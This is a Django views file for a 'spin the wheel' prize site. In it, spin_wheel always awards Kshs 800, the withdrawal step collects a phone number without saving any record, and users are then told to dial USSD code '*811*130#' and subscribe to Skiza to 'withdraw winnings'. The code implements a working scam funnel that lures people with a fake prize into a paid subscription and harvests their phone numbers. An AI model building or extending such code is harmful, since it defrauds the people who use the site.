'from django.shortcuts import render, redirect\nfrom django.http import JsonResponse\nfrom django.views.decorators.http import require_http_methods, require_POST\nfrom django.views.decorators.csrf import csrf_exempt\nfrom .models import WithdrawalRequest\nfrom .forms import WithdrawalRequestForm\nimport json\n\n\ndef loading_animation(request):\n    """\n    Display loading animation page (first page users see).\n    Auto-redirects to landing page after 2 seconds.\n    """\n    return render(request, 'wheel_spin/loading.html')\n\ndef landing_page(request):\n    """\n    Main landing page with the spin wheel.\n    Users can spin once per session.\n    """\n    # Check if user has already spun in this session\n    has_spun = request.session.get('has_spun', False)\n    amount_won = request.session.get('amount_won', None)\n    \n    context = {\n        'has_spun': has_spun,\n        'amount_won': amount_won,\n    }\n    return render(request, 'wheel_spin/landing.html', context)\n\n\n@require_POST\ndef spin_wheel(request):\n    """\n    AJAX endpoint for spinning the wheel.\n    Always returns 800 as the winning amount (as per spec).\n    """\n    # Check if user has already spun - REMOVED for unlimited spins\n    # Logic removed to allow unlimited spins\n\n    \n    # Always return 800 as winning amount (as per specification)\n    winning_amount = 800\n    \n    # Store in session\n    request.session['has_spun'] = True\n    request.session['amount_won'] = winning_amount\n    \n    return JsonResponse({\n        'success': True,\n        'amount': winning_amount,\n        'message': f'Congratulations! You won Kshs {winning_amount}!'\n    })\n\ndef withdrawal_request(request):\n    """\n    Display withdrawal request form page.\n    Shows the amount won and collects phone number.\n    """\n    # Check if user has spun the wheel\n    if not request.session.get('has_spun', False):\n        return redirect('landing_page')\n    \n    amount_won = request.session.get('amount_won', 800)\n    form = WithdrawalRequestForm()\n    \n    context = {\n        'form': form,\n        'amount_won': amount_won,\n    }\n    return render(request, 'wheel_spin/withdrawal.html', context)\n\n@require_POST\ndef submit_withdrawal(request):\n    """\n    AJAX endpoint for submitting withdrawal request.\n    Validates phone number and creates withdrawal record.\n    """\n    try:\n        # Get data from request\n        data = json.loads(request.body)\n        phone_number = data.get('phone_number', '').strip()\n        \n        # Check if user has spun\n        if not request.session.get('has_spun', False):\n            return JsonResponse({\n                'success': False,\n                'error': 'Please spin the wheel first.'\n            }, status=400)\n        \n        # Get amount won from session\n        amount_won = request.session.get('amount_won', 800)\n        \n        # Create form instance for validation\n        form = WithdrawalRequestForm(data={'phone_number': phone_number})\n        \n        if form.is_valid():\n            # NO DATABASE SAVE REQUIRED\n            # Ideally we would send an SMS here, but for this flow we just return success\n            \n            # withdrawal = WithdrawalRequest.objects.create(...)  <-- Removed\n            \n            # Store dummy withdrawal ID in session to allow access to next page if needed\n            request.session['withdrawal_id'] = 'dummy_id'\n            \n            return JsonResponse({\n                'success': True,\n                'ussd_code': '*811*130#',\n                'message': 'Withdrawal request submitted successfully'\n            })\n        else:\n            # Return validation errors\n            errors = []\n            for field, error_list in form.errors.items():\n                for error in error_list:\n                    errors.append(error)\n            \n            return JsonResponse({\n                'success': False,\n                'error': ' '.join(errors)\n            }, status=400)\n            \n    except json.JSONDecodeError:\n        return JsonResponse({\n            'success': False,\n            'error': 'Invalid request data.'\n        }, status=400)\n    except Exception as e:\n        return JsonResponse({\n            'success': False,\n            'error': 'An error occurred. Please try again.'\n        }, status=500)\n\ndef subscription_instructions(request):\n    """\n    Display Skiza subscription instructions with USSD code.\n    Shows how to subscribe to withdraw winnings.\n    """\n    # Check if withdrawal request exists\n    if not request.session.get('withdrawal_id'):\n        return redirect('withdrawal_request')\n    \n    amount_won = request.session.get('amount_won', 800)\n    \n    context = {\n        'amount_won': amount_won,\n        'ussd_code': '*811*130#',\n    }\n    return render(request, 'wheel_spin/subscription.html', context)\n\ndef processing_confirmation(request):\n    """\n    Display processing confirmation page.\n    Shows that withdrawal request is being processed.\n    """\n    # Check if withdrawal request exists\n    withdrawal_id = request.session.get('withdrawal_id')\n    if not withdrawal_id:\n        return redirect('landing_page')\n    \n    try:\n        withdrawal = WithdrawalRequest.objects.get(id=withdrawal_id)\n        # Update status to processing\n        withdrawal.status = 'processing'\n        withdrawal.save()\n    except WithdrawalRequest.DoesNotExist:\n        pass\n    \n    amount_won = request.session.get('amount_won', 800)\n    \n    # Clear session data (allow new spins)\n    request.session.flush()\n    \n    context = {\n        'amount_won': amount_won,\n    }\n    return render(request, 'wheel_spin/confirmation.html', context)\n\ndef how_it_works(request):\n    """\n    Display 'How It Works' information page.\n    """\n    return render(request, 'wheel_spin/how_it_works.html')\n\ndef terms_and_conditions(request):\n    """\n    Display Terms & Conditions page.\n    """\n    return render(request, 'wheel_spin/terms.html')\n\ndef privacy_policy(request):\n    """\n    Display Privacy Policy page.\n    """\n    return render(request, 'wheel_spin/privacy.html')\n'